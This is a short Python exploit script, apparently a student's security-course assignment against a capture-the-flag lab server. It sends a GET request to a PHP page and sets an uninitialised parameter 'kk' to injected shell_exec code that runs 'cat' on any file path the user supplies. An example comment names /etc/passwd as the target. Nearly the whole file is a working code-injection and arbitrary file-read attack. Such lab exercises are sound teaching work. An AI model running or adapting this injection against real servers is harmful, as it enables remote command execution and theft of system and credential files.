#!/usr/bin/env python3

#Garrett Gregory
#CSCI 461
#Assignment 1

#Prints the contents of a user-specified file that can be accessed from the point
#of the exploit. If the file cannot be accessed, the output will be blank.

import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python3 hw1exploit.py target_file_path")
    print("Should be full file path, starting with / and ending with the filename.")
    #example: python3 hw1exploit.py /usr/ctf/mulemanager/html/login.php
    #example: python3 hw1exploit.py /etc/passwd

else:
    filePath = sys.argv[1]
    #shell code to be executed
    shellKode = "echo shell_exec("+'"cat '+filePath+'");'
    #the variable kk was not initialized in the .php file. set its value to shell code and execute.
    r = requests.get("http://192.168.56.2:7899/images/logo_large.php", params={'kk': shellKode})
    #print the contents of the user-specified file
    print("\n"+r.text)
